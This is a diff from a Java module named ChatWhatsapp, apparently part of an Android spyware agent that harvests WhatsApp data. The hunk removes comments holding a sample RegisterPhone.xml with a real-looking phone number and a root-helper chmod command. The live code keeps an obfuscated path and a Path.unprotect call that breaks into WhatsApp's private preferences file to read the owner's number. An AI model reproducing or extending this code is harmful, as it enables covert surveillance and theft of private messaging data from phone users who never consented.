@@ -117,36 +117,12 @@ public class ChatWhatsapp extends SubModuleChat {
 	}
 
 	private String readMyPhoneNumber() {
-		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
-		/*
-		 * <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map>
-		 * <string
-		 * name="com.whatsapp.RegisterPhone.phone_number">3938980634</string>
-		 * <int name="com.whatsapp.RegisterPhone.country_code_position"
-		 * value="-1" /> <boolean name="com.whatsapp.RegisterPhone.no_self_send"
-		 * value="false" /> <int
-		 * name="com.whatsapp.RegisterPhone.verification_state" value="14" />
-		 * <int name="com.whatsapp.RegisterPhone.phone_number_position"
-		 * value="10" /> <string
-		 * name="com.whatsapp.RegisterPhone.input_country_code">39</string>
-		 * <string name="com.whatsapp.RegisterPhone.input_phone_number">393 898
-		 * 0634</string> <string
-		 * name="com.whatsapp.RegisterPhone.prev_country_code">39</string>
-		 * <string name="com.whatsapp.RegisterPhone.country_code">39</string>
-		 * <string
-		 * name="com.whatsapp.RegisterPhone.prev_phone_number">3938980634
-		 * </string> </map>
-		 */
-
 		String myPhone = DEFAULT_LOCAL_NUMBER;
 		String myCountryCode = "";
 
 		String filename = M.e("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
 		try {
-			// f_2=/system/bin/rilcapsvd pzm 777
 			Path.unprotect(filename, 2, true);
-			// Runtime.getRuntime().exec(M.d("/system/bin/rilcapsvd pzm 777 ") +
-			// filename);
 			File file = new File(filename);
 
 			if (Cfg.DEBUG) {
